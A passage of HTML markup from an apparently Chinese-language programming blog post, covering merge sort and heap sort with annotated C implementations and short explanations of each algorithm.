class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 子数组索引,前一个为A[left...mid]，后一个子数组为A[mid+1...right]</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">i *</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 子数组的大小i初始为1，每轮翻倍</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-53\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-54\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">              </span><span class=\"crayon-c\">// 后一个子数组存在(需要归并)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-55\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-56\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-57\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">len</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 后一个子数组大小可能不够</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-58\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">Merge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mid</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-59\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">               </span><span class=\"crayon-c\">// 前一个子数组索引向后移动</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-60\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-61\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-62\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-64\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-65\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-66\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A1</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">      </span><span class=\"crayon-c\">// 从小到大归并排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-67\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A2</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-69\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-70\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">MergeSortRecursion</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">          </span><span class=\"crayon-c\">// 递归实现</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">MergeSortIteration</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                 </span><span class=\"crayon-c\">// 非递归实现</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-72\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"递归实现的归并排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-73\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-74\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-75\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A1</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-76\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-77\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-78\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"非递归实现的归并排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-79\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n2</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-80\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-81\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A2</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-82\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-83\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b84396513457-84\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b84396513457-85\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.6013 seconds] -->\r\n<p>上述代码对序列{ 6, 5, 3, 1, 8, 7, 2, 4 }进行归并排序的实例如下</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773s9549g208c05040s.gif\" width=\"300\" height=\"180\"></p>\n<p>使用归并排序为一列数字进行排序的宏观过程：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fr773taxtag2064056wl0.gif\" width=\"220\" height=\"186\"></p>\n<p>归并排序除了可以对数组进行排序，还可以高效的求出数组小和（即单调和）以及数组中的逆序对，详见这篇<a title=\"wang7010957\" href=\"http://www.jianshu.com/p/3ab5033074f1\" target=\"_blank\">博文</a>。</p>\n<h2>堆排序(Heap Sort)</h2>\n<p>堆排序是指利用堆这种数据结构所设计的一种选择排序算法。堆是一种近似完全二叉树的结构（通常堆是通过一维数组来实现的），并满足性质：以最大堆（也叫大根堆、大顶堆）为例，其中父结点的值总是大于它的孩子节点。</p>\n<p>我们可以很容易的定义堆排序的过程：</p>\n<ol>\n<li>由输入的无序数组构造一个最大堆，作为初始的无序区</li>\n<li>把堆顶元素（最大值）和堆尾元素互换</li>\n<li>把堆（无序区）的尺寸缩小1，并调用heapify(A, 0)从新的堆顶元素开始进行堆调整</li>\n<li>重复步骤2，直到堆的尺寸为1</li>\n</ol>\n<p>堆排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b8b427729141\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;\r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(nlogn)\r\n// 最优时间复杂度 ---- O(nlogn)\r\n// 平均时间复杂度 ---- O(nlogn)\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 不稳定\r\n\r\n\r\nvoid Swap(int A[], int i, int j)\r\n{\r\n    int temp = A[i];\r\n    A[i] = A[j];\r\n    A[j] = temp;\r\n}\r\n\r\nvoid Heapify(int A[], int i, int size)  // 从A[i]向下进行堆调整\r\n{\r\n    int left_child = 2 * i + 1;         // 左孩子索引\r\n    int right_child = 2 * i + 2;        // 右孩子索引\r\n    int max = i;                        // 选出当前结点与其左右孩子三者之中的最大值\r\n    if (left_child &lt; size &amp;&amp; A[left_child] &gt; A[max])\r\n        max = left_child;\r\n    if (right_child &lt; size &amp;&amp; A[right_child] &gt; A[max])\r\n        max = right_child;\r\n    if (max != i)\r\n    {\r\n        Swap(A, i, max);                // 把当前结点和它的最大(直接)子节点进行交换\r\n        Heapify(A, max, size);          // 递归调用，继续从当前结点向下进行堆调整\r\n    }\r\n}\r\n\r\nint BuildHeap(int A[], int n)           // 建堆，时间复杂度O(n)\r\n{\r\n    int heap_size = n;\r\n    for (int i = heap_size / 2 - 1; i &gt;= 0; i--) // 从每一个非叶结点开始向下进行堆调整\r\n        Heapify(A, i, heap_size);\r\n    return heap_size;\r\n}\r\n\r\nvoid HeapSort(int A[], int n)\r\n{\r\n    int heap_size = BuildHeap(A, n);    // 建立一个最大堆\r\n    while (heap_size &gt; 1)    　　　　　　 // 堆（无序区）元素个数大于1，未完成排序\r\n    {\r\n        // 将堆顶元素与堆的最后一个元素互换，并从堆中去掉最后一个元素\r\n        // 此处交换操作很有可能把后面元素的稳定性打乱，所以堆排序是不稳定的排序算法\r\n        Swap(A, 0, --heap_size);\r\n        Heapify(A, 0, heap_size);     // 从新的堆顶元素开始向下进行堆调整，时间复杂度O(logn)\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 };// 从小到大堆排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    HeapSort(A, n);\r\n    printf(\"堆排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b8b427729141-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b8b427729141-67\">67</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-3\"><span class=\"crayon-c\">// 分类 -------------- 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-4\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b8b427729141-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b8b427729141-6\"><span class=\"crayon-c\">// 